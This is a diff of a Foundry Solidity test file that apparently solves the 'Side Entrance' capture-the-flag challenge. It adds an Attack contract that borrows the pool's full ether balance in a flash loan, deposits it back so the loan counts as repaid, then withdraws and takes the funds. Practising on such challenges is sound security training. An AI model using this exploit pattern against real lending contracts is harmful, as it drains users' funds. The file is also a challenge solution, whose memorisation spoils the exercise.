@@ -3,7 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SideEntranceLenderPool} from "../src/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../src/1.sol";
 
 contract testContract1 is Test {
     address deployer = makeAddr("deployer");
@@ -45,7 +45,8 @@ contract testContract1 is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        pool.flashLoan(ETHER_IN_POOL);
+        Attack attack_contract = new Attack(address(pool));
+        attack_contract.attack();
     }
 
     function execute() external payable {
@@ -59,6 +60,25 @@ contract testContract1 is Test {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
     }
+}
 
 
+contract Attack is IFlashLoanEtherReceiver{
+    SideEntranceLenderPool private immutable sideEntrance;
+    constructor(address _sideEntrance){
+        sideEntrance = SideEntranceLenderPool(_sideEntrance);
+    }
+    function execute() external payable{
+        sideEntrance.deposit{value:msg.value}();
+    }
+
+    function attack() external{
+        sideEntrance.flashLoan(address(sideEntrance).balance);
+        sideEntrance.withdraw();
+        (bool success, ) = payable(msg.sender).call{value: address(this).balance}('');
+        if(!success){
+          revert('send failed');
+        }
+    }
+    receive() external payable {}
 }
